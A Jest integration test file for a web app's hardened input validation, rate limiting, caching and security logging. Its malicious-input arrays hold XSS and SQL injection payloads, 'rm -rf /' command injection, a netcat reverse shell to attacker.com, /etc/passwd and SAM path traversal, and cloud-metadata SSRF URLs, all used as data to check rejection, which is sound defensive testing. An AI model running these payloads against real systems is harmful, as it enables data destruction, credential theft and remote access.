/**
 * Integration Tests for Enhanced Validation System
 * Tests the complete validation pipeline from API to security monitoring
 * Ref: CLAUDE.md - Comprehensive validation integration testing
 */

import { describe, test, expect, beforeEach, afterEach } from '@jest/globals';
import request from 'supertest';
import {
  validate,
  validateWithRateLimit,
  validateWithCache,
  validateBatch,
  CreateRoadmapSchema,
  UpdateRoadmapSchema,
  CreateSnippetSchema,
  ListQuerySchema,
  UUIDSchema,
  ValidationError,
  globalRateLimiter,
  validationCache,
  performanceMonitor,
  LazyValidator
} from '../src/validation/hardened-validation';
import { SecurityLogger, SecurityEventType } from '../src/monitoring/security-logger';
import { ValidationSecurityLogger } from '../src/middleware/validation';

describe('Enhanced Validation System Integration Tests', () => {
  let securityLogger;
  let validationSecurityLogger;

  beforeEach(() => {
    // Reset all monitoring and caching systems
    globalRateLimiter.cleanup = jest.fn();
    validationCache.clear();
    performanceMonitor.reset();

    securityLogger = SecurityLogger.getInstance();
    validationSecurityLogger = ValidationSecurityLogger.getInstance();
  });

  afterEach(() => {
    // Cleanup after each test
    validationCache.clear();
    performanceMonitor.reset();
  });

  describe('Enhanced Security Validation', () => {
    test('should detect and block comprehensive malicious patterns', () => {
      const maliciousInputs = [
        // XSS attempts
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert("xss")>',
        'javascript:void(alert("xss"))',

        // SQL injection attempts
        "'; DROP TABLE users; --",
        "' OR 1=1 --",
        'UNION SELECT password FROM users',

        // Command injection attempts
        '$(rm -rf /)',
        '`cat /etc/passwd`',
        '| nc -e /bin/sh attacker.com 4444',

        // Path traversal attempts
        '../../../etc/passwd',
        '..\\..\\windows\\system32\\config\\sam',

        // Modern JS exploitation
        'eval(atob("YWxlcnQoJ3hzcycp"))',
        'Function("return this")().alert("xss")',
        'window["eval"]("alert(1)")',

        // Template injection
        '{{7*7}}',
        '${7*7}',
        '<%=7*7%>',

        // Protocol handlers
        'data:text/html,<script>alert(1)</script>',
        'vbscript:msgbox("xss")',
        'chrome://settings/',

        // Obfuscation techniques
        '\\u0061\\u006C\\u0065\\u0072\\u0074(1)',
        '%65%76%61%6C(%61%6C%65%72%74%28%31%29)',
        String.fromCharCode(97,108,101,114,116,40,49,41)
      ];

      maliciousInputs.forEach(input => {
        const result = validate(CreateSnippetSchema, {
          category: 'test',
          code: input,
          title: 'Test'
        });

        expect(result.success).toBe(false);
        if (!result.success) {
          expect(result.error.details.some(d =>
            d.message.includes('dangerous') || d.message.includes('malicious')
          )).toBe(true);
        }
      });
    });

    test('should validate comprehensive URL security', () => {
      const dangerousUrls = [
        // Protocol-based attacks
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'vbscript:msgbox("xss")',
        'file:///etc/passwd',
        'ftp://internal.server.com/file',

        // Internal network access
        'http://localhost:8080/admin',
        'http://127.0.0.1:3000/dashboard',
        'http://192.168.1.1/router',
        'http://10.0.0.1/internal',
        'http://172.16.0.1/private',
        'http://169.254.169.254/metadata', // AWS metadata service
        'http://metadata.google.internal/', // GCP metadata

        // IPv6 internal addresses
        'http://[::1]:8080/admin',
        'http://[fe80::1]:3000/local',
        'http://[fc00::1]/internal',

        // DNS rebinding attempts
        'http://localtest.me/admin',
        'http://local.test/internal',

        // Port-based attacks
        'http://example.com:22/ssh',
        'http://example.com:3389/rdp',
        'http://example.com:5432/postgres',
        'http://example.com:6379/redis',
        'http://example.com:9200/elasticsearch',

        // Suspicious TLDs
        'http://internal.local/admin',
        'http://server.corp/data',
        'http://device.home/config',

        // URL encoding bypasses
        'http://127.0.0.1/%61%64%6d%69%6e', // encoded /admin
        'http://localhost/%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64' // encoded /../etc/passwd
      ];

      dangerousUrls.forEach(url => {
        const result = validate(CreateSnippetSchema, {
          category: 'test',
          code: 'console.log("test");',
          title: 'Test',
          ui_preview_url: url
        });

        expect(result.success).toBe(false);
        if (!result.success) {
          expect(result.error.details.some(d =>
            d.field === 'ui_preview_url' &&
            (d.message.includes('Invalid') || d.message.includes('dangerous'))
          )).toBe(true);
        }
      });
    });

    test('should allow safe URLs', () => {
      const safeUrls = [
        'https://example.com/image.png',
        'https://cdn.example.com/assets/logo.svg',
        'https://api.example.com/v1/preview',
        'https://sub.domain.com/path/to/resource',
        'http://example.com/public/image.jpg'
      ];

      safeUrls.forEach(url => {
        const result = validate(CreateSnippetSchema, {
          category: 'test',
          code: 'console.log("test");',
          title: 'Test',
          ui_preview_url: url
        });

        expect(result.success).toBe(true);
      });
    });
  });

  describe('Rate Limiting Integration', () => {
    test('should enforce rate limits across multiple validation attempts', () => {
      const testData = {
        category: 'test',
        code: 'console.log("test");',
        title: 'Test'
      };

      const userIdentifier = 'test-user-rate-limit';
      let successCount = 0;
      let rateLimitCount = 0;

      // Attempt 150 validations (exceeds default limit of 100)
      for (let i = 0; i < 150; i++) {
        const result = validateWithRateLimit(
          CreateSnippetSchema,
          testData,
          userIdentifier
        );

        if (result.success) {
          successCount++;
        } else if (result.error.statusCode === 429) {
          rateLimitCount++;
        }
      }

      // Should allow 100 requests and block 50
      expect(successCount).toBe(100);
      expect(rateLimitCount).toBe(50);
    });

    test('should reset rate limits after time window', async () => {
      const testData = { category: 'test', code: 'console.log("test");', title: 'Test' };
      const userIdentifier = 'test-user-reset';

      // Fill rate limit
      for (let i = 0; i < 100; i++) {
        validateWithRateLimit(CreateSnippetSchema, testData, userIdentifier);
      }

      // Next request should be rate limited
      const rateLimitedResult = validateWithRateLimit(
        CreateSnippetSchema,
        testData,
        userIdentifier
      );
      expect(rateLimitedResult.success).toBe(false);
      expect(rateLimitedResult.error?.statusCode).toBe(429);

      // Simulate time passage by manually cleaning up rate limiter
      globalRateLimiter.cleanup();

      // Should work again (in real implementation, would need to wait for time window)
      const resetResult = validate(CreateSnippetSchema, testData);
      expect(resetResult.success).toBe(true);
    });
  });

  describe('Performance Optimization Integration', () => {
    test('should cache validation results effectively', () => {
      const testData = {
        category: 'test',
        code: 'console.log("cached test");',
        title: 'Cached Test'
      };

      // Clear performance metrics
      performanceMonitor.reset();

      // First validation - should not be cached
      const result1 = validateWithCache(CreateSnippetSchema, testData);
      expect(result1.success).toBe(true);

      // Second validation - should be cached
      const result2 = validateWithCache(CreateSnippetSchema, testData);
      expect(result2.success).toBe(true);

      // Verify caching worked (both results should be identical)
      expect(result1.data).toEqual(result2.data);

      // Check cache stats
      const cacheStats = validationCache.getStats();
      expect(cacheStats.size).toBeGreaterThan(0);
    });

    test('should handle batch validation efficiently', async () => {
      const testDataArray = Array.from({ length: 50 }, (_, i) => ({
        category: 'test',
        code: `console.log("batch test ${i}");`,
        title: `Batch Test ${i}`
      }));

      // Test sequential batch validation
      const sequentialResults = await validateBatch(
        CreateSnippetSchema,
        testDataArray,
        { parallel: false, useCache: true }
      );

      expect(sequentialResults).toHaveLength(50);
      expect(sequentialResults.every(r => r.success)).toBe(true);

      // Test parallel batch validation
      const parallelResults = await validateBatch(
        CreateSnippetSchema,
        testDataArray,
        { parallel: true, batchSize: 10, useCache: true }
      );

      expect(parallelResults).toHaveLength(50);
      expect(parallelResults.every(r => r.success)).toBe(true);
    });

    test('should handle large object validation with memory limits', () => {
      // Create a large but valid roadmap
      const largeNodes = Array.from({ length: 50 }, (_, i) => ({
        id: `node-${i}`,
        label: `Node ${i}`,
        position: { x: i * 10, y: i * 10, z: 0 },
        status: 'gray',
        type: 'default'
      }));

      const largeEdges = Array.from({ length: 49 }, (_, i) => ({
        from: `node-${i}`,
        to: `node-${i + 1}`,
        type: 'default'
      }));

      const largeRoadmapData = {
        json_graph: JSON.stringify({ nodes: largeNodes, edges: largeEdges }),
        title: 'Large Test Roadmap',
        description: 'A roadmap with many nodes for testing'
      };

      const result = validate(CreateRoadmapSchema, largeRoadmapData);
      expect(result.success).toBe(true);
    });

    test('should reject oversized inputs', () => {
      // Create an input that exceeds default size limits
      const oversizedCode = 'x'.repeat(15000); // Exceeds 10000 char limit

      const result = validate(CreateSnippetSchema, {
        category: 'test',
        code: oversizedCode,
        title: 'Oversized Test'
      });

      expect(result.success).toBe(false);
      if (!result.success) {
        expect(result.error.details.some(d =>
          d.field === 'code' && d.message.includes('too long')
        )).toBe(true);
      }
    });
  });

  describe('Lazy Validation', () => {
    test('should defer validation until needed', () => {
      const testData = {
        category: 'test',
        code: 'console.log("lazy test");',
        title: 'Lazy Test'
      };

      const lazyValidator = new LazyValidator(CreateSnippetSchema, testData);

      // Validation should not have occurred yet
      expect(lazyValidator.cached?.validated).toBeFalsy();

      // Check validity - this should trigger validation
      const isValid = lazyValidator.isValid();
      expect(isValid).toBe(true);

      // Get data - should use cached validation result
      const data = lazyValidator.getData();
      expect(data.title).toBe('Lazy Test');
    });

    test('should cache lazy validation results', () => {
      const testData = {
        category: 'test',
        code: 'console.log("lazy cached test");',
        title: 'Lazy Cached Test'
      };

      const lazyValidator = new LazyValidator(CreateSnippetSchema, testData);

      // Multiple calls should use cached result
      const result1 = lazyValidator.validate();
      const result2 = lazyValidator.validate();

      expect(result1).toBe(result2); // Should be same object reference
      expect(result1.success).toBe(true);
    });
  });

  describe('Security Monitoring Integration', () => {
    test('should log validation failures with security context', () => {
      const maliciousData = {
        category: 'test',
        code: '<script>alert("xss")</script>',
        title: 'Malicious Test'
      };

      // Mock console methods to capture logs
      const originalWarn = console.warn;
      const originalError = console.error;
      const loggedMessages = [];

      console.warn = jest.fn((...args) => loggedMessages.push({ level: 'warn', args }));
      console.error = jest.fn((...args) => loggedMessages.push({ level: 'error', args }));

      const result = validate(CreateSnippetSchema, maliciousData);

      expect(result.success).toBe(false);

      // Log validation failure through security logger
      if (!result.success) {
        securityLogger.logValidationFailure(
          '192.168.1.100',
          'test-user-agent',
          'test-user-id',
          '/api/snippets',
          'POST',
          result.error,
          maliciousData
        );
      }

      // Verify security event was logged
      const events = securityLogger.getEvents({
        type: SecurityEventType.MALICIOUS_INPUT,
        limit: 1
      });

      expect(events).toHaveLength(1);
      expect(events[0].type).toBe(SecurityEventType.MALICIOUS_INPUT);
      expect(events[0].source.ip).toBe('192.168.1.100');

      // Restore console methods
      console.warn = originalWarn;
      console.error = originalError;
    });

    test('should track attack patterns over time', () => {
      const attackPatterns = [
        { code: 'eval("malicious")', pattern: 'eval' },
        { code: '<script>alert(1)</script>', pattern: 'xss' },
        { code: '\'; DROP TABLE users; --', pattern: 'sqli' },
        { code: '$(rm -rf /)', pattern: 'cmdi' }
      ];

      attackPatterns.forEach((attack, index) => {
        const result = validate(CreateSnippetSchema, {
          category: 'test',
          code: attack.code,
          title: `Attack ${index}`
        });

        expect(result.success).toBe(false);

        if (!result.success) {
          securityLogger.logValidationFailure(
            '192.168.1.101',
            'attack-bot/1.0',
            undefined,
            '/api/snippets',
            'POST',
            result.error,
            { attackType: attack.pattern }
          );
        }
      });

      // Verify multiple attack patterns were logged
      const events = securityLogger.getEvents({ ip: '192.168.1.101' });
      expect(events.length).toBeGreaterThanOrEqual(4);

      // Check security metrics
      const metrics = securityLogger.getMetrics();
      expect(metrics.maliciousInputs).toBeGreaterThanOrEqual(4);
    });

    test('should generate comprehensive security reports', () => {
      // Simulate various security events
      const timeRange = {
        start: new Date(Date.now() - 3600000).toISOString(), // 1 hour ago
        end: new Date().toISOString()
      };

      // Generate different types of validation failures
      const scenarios = [
        { ip: '10.0.0.1', code: 'eval("test")', severity: 'high' },
        { ip: '10.0.0.1', code: '<script>alert(1)</script>', severity: 'high' },
        { ip: '10.0.0.2', code: 'normal code', severity: 'low' },
        { ip: '10.0.0.3', code: 'SELECT * FROM users', severity: 'medium' }
      ];

      scenarios.forEach((scenario, index) => {
        const result = validate(CreateSnippetSchema, {
          category: 'test',
          code: scenario.code,
          title: `Test ${index}`
        });

        if (!result.success && scenario.code !== 'normal code') {
          securityLogger.logValidationFailure(
            scenario.ip,
            'test-agent',
            undefined,
            '/api/snippets',
            'POST',
            result.error
          );
        }
      });

      // Generate security report
      const report = securityLogger.generateSecurityReport(timeRange);

      expect(report.summary).toBeDefined();
      expect(report.topIPs).toBeInstanceOf(Array);
      expect(report.topEndpoints).toBeInstanceOf(Array);
      expect(report.attackPatterns).toBeDefined();
      expect(report.recommendations).toBeInstanceOf(Array);
      expect(report.recommendations.length).toBeGreaterThan(0);
    });
  });

  describe('GraphQL Validation Integration', () => {
    test('should validate complex GraphQL inputs with rate limiting', () => {
      const complexRoadmapInput = {
        json_graph: {
          nodes: [
            { id: 'start', label: 'Start', position: { x: 0, y: 0, z: 0 }, type: 'start' },
            { id: 'middle', label: 'Process', position: { x: 100, y: 100, z: 0 }, type: 'process' },
            { id: 'end', label: 'End', position: { x: 200, y: 200, z: 0 }, type: 'end' }
          ],
          edges: [
            { from: 'start', to: 'middle', type: 'default' },
            { from: 'middle', to: 'end', type: 'success' }
          ]
        },
        title: 'Complex GraphQL Test',
        description: 'Testing GraphQL input validation',
        vibe_mode: true,
        visibility: 'private',
        tags: ['test', 'graphql']
      };

      const result = validate(CreateRoadmapSchema, complexRoadmapInput);
      expect(result.success).toBe(true);

      if (result.success) {
        expect(result.data.json_graph.nodes).toHaveLength(3);
        expect(result.data.json_graph.edges).toHaveLength(2);
        expect(result.data.title).toBe('Complex GraphQL Test');
        expect(result.data.vibe_mode).toBe(true);
      }
    });

    test('should reject GraphQL inputs with invalid references', () => {
      const invalidRoadmapInput = {
        json_graph: {
          nodes: [
            { id: 'node1', label: 'Node 1', position: { x: 0, y: 0, z: 0 } }
          ],
          edges: [
            { from: 'node1', to: 'nonexistent', type: 'default' } // Invalid reference
          ]
        },
        title: 'Invalid GraphQL Test'
      };

      const result = validate(CreateRoadmapSchema, invalidRoadmapInput);
      expect(result.success).toBe(false);

      if (!result.success) {
        expect(result.error.details.some(d =>
          d.message.includes('Edges reference non-existent nodes')
        )).toBe(true);
      }
    });
  });

  describe('Performance Metrics', () => {
    test('should collect comprehensive performance metrics', () => {
      // Reset metrics
      performanceMonitor.reset();

      const testData = {
        category: 'test',
        code: 'console.log("performance test");',
        title: 'Performance Test'
      };

      // Perform several validations
      for (let i = 0; i < 10; i++) {
        const result = validateWithCache(CreateSnippetSchema, testData);
        expect(result.success).toBe(true);
      }

      const metrics = performanceMonitor.getMetrics();
      expect(metrics.totalValidations).toBe(10);
      expect(metrics.avgTime).toBeGreaterThan(0);
      expect(metrics.cacheHits + metrics.cacheMisses).toBe(10);
      expect(metrics.errors).toBe(0);
    });

    test('should track slow validation operations', () => {
      // Reset metrics
      performanceMonitor.reset();

      // Create a complex validation that might be slow
      const complexNodes = Array.from({ length: 100 }, (_, i) => ({
        id: `node-${i}`,
        label: `Complex Node ${i}`,
        position: { x: i * 5, y: i * 5, z: 0 },
        type: 'process'
      }));

      const complexEdges = Array.from({ length: 99 }, (_, i) => ({
        from: `node-${i}`,
        to: `node-${i + 1}`,
        type: 'default'
      }));

      const complexData = {
        json_graph: JSON.stringify({ nodes: complexNodes, edges: complexEdges }),
        title: 'Complex Performance Test',
        description: 'Testing performance with complex data'
      };

      // This validation might be slow due to complexity
      const result = validate(CreateRoadmapSchema, complexData);
      expect(result.success).toBe(true);

      const metrics = performanceMonitor.getMetrics();
      expect(metrics.totalValidations).toBe(1);
      // Note: In a real scenario, this might register as a slow query
    });
  });

  describe('Error Handling and Recovery', () => {
    test('should handle malformed JSON gracefully', () => {
      const malformedData = {
        json_graph: 'this is not valid JSON',
        title: 'Malformed Test'
      };

      const result = validate(CreateRoadmapSchema, malformedData);
      expect(result.success).toBe(false);

      if (!result.success) {
        expect(result.error.details.some(d =>
          d.field === 'json_graph' && d.message.includes('Invalid JSON')
        )).toBe(true);
      }
    });

    test('should provide detailed error context for debugging', () => {
      const invalidData = {
        // Missing required fields
        title: '', // Empty title
        json_graph: {
          nodes: [
            { id: '', label: '', position: { x: 'invalid', y: 'invalid' } } // Invalid types
          ],
          edges: []
        }
      };

      const result = validate(CreateRoadmapSchema, invalidData);
      expect(result.success).toBe(false);

      if (!result.success) {
        // Should have multiple detailed errors
        expect(result.error.details.length).toBeGreaterThan(1);
        expect(result.error.details.every(d =>
          d.hasOwnProperty('field') &&
          d.hasOwnProperty('message') &&
          d.hasOwnProperty('type')
        )).toBe(true);
      }
    });
  });
});

// Export test utilities for use in other test files
export const testData = {
  validRoadmap: {
    json_graph: {
      nodes: [
        { id: 'n1', label: 'Start', position: { x: 0, y: 0, z: 0 }, status: 'gray', type: 'start' },
        { id: 'n2', label: 'End', position: { x: 100, y: 100, z: 0 }, status: 'gray', type: 'end' }
      ],
      edges: [{ from: 'n1', to: 'n2', type: 'default' }]
    },
    title: 'Integration Test Roadmap',
    description: 'Used for integration testing',
    vibe_mode: false,
    visibility: 'private'
  },
  validSnippet: {
    category: 'integration-test',
    code: 'console.log("Integration test snippet");',
    title: 'Integration Test Snippet',
    description: 'Used for integration testing',
    language: 'javascript'
  },
  maliciousInputs: [
    '<script>alert("xss")</script>',
    "'; DROP TABLE users; --",
    '$(rm -rf /)',
    'eval("malicious")',
    'javascript:alert(1)',
    '../../../etc/passwd'
  ],
  validQuery: {
    limit: 10,
    offset: 0,
    sort: 'created_at',
    order: 'desc'
  }
};